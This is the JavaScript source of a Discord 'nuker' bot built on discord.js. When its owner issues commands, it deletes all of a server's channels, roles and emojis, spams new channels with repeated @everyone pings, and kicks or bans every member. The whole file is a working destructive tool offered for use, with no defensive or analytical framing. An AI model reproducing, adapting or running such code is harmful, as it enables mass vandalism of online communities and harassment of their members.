const { token, prefix, randomChannelNames, randomPingMessages, randomRoleNames, ownerId} = require('./config.json');
const discord = require('discord.js');
const discBuilders = require('@discordjs/builders');
const { red, green, blue, cyan } = require('chalk');
const bot = new discord.Client({ intents: [discord.Intents.FLAGS.GUILD_PRESENCES, discord.Intents.FLAGS.GUILDS, discord.Intents.FLAGS.GUILD_MEMBERS, discord.Intents.FLAGS.GUILD_MESSAGES, discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS, discord.Intents.FLAGS.GUILD_BANS]});

bot.once('ready', () => {
    console.log(cyan(`

	██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
	██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
	██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
	██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
	██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
	╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝																							   
					made by @unchilled on GH
`));
	console.log(green(`
Logged in as: ${bot.user.tag}
Owner ID: ${ownerId}
Prefix: ${prefix}
`));	
	console.log(cyan(`Commands: 
${prefix}nuke - delete all channels, roles, and emojis.
${prefix}spamnuke - delete all channels, roles, and emojis, spam create roles+channels and spam ping @everyone.
${prefix}kickall - kick all members from the server.
${prefix}banall - ban all members from the server.
${prefix}delchannels - delete all channels.
${prefix}delroles - delete all roles.
`)) 
})

bot.on('messageCreate', msg => {
	if(msg.content == prefix + 'spamnuke' && msg.member.id == ownerId) {
		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.emojis.cache.forEach(emoji => emoji.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		for (let i = 0; i < 100; i++) {
			var randomChannelNumber = Math.floor(Math.random()*randomChannelNames.length);
			msg.guild.channels.create(randomChannelNames[randomChannelNumber]).then(channel => {
				for (let i = 0; i < 30; i++) {
					var randomPingNumber = Math.floor(Math.random()*randomPingMessages.length);
					channel.send('@everyone ' + randomPingMessages[randomPingNumber]).catch((err) => { console.log(red("Error Found: " + err)) })
				}
			}).catch((err) => { console.log(red("Error Found: " + err)) });
			var randomRoleNumber = Math.floor(Math.random()*randomRoleNames.length);
			msg.guild.roles.create({ name: randomRoleNames[randomRoleNumber], color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
		}
		console.log(green(`${msg.guild.name} was spam nuked!`))
	} else if (msg.content == prefix + 'nuke' && msg.member.id == ownerId) {
		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.emojis.cache.forEach(emoji => emoji.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`${msg.guild.name} was nuked!`))
	} else if (msg.content == prefix + 'kickall' && msg.member.id == ownerId) {
		msg.guild.members.cache.forEach(member => member.kick().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`All members kicked in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'banall' && msg.member.id == ownerId) {
		msg.guild.members.cache.forEach(member => member.ban().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`All members banned in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'delchannels' && msg.member.id == ownerId) {
		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`All channels deleted in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'delroles' && msg.member.id == ownerId) {
		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`All roles deleted in ${msg.guild.name}!`))
	}
})

bot.login(token)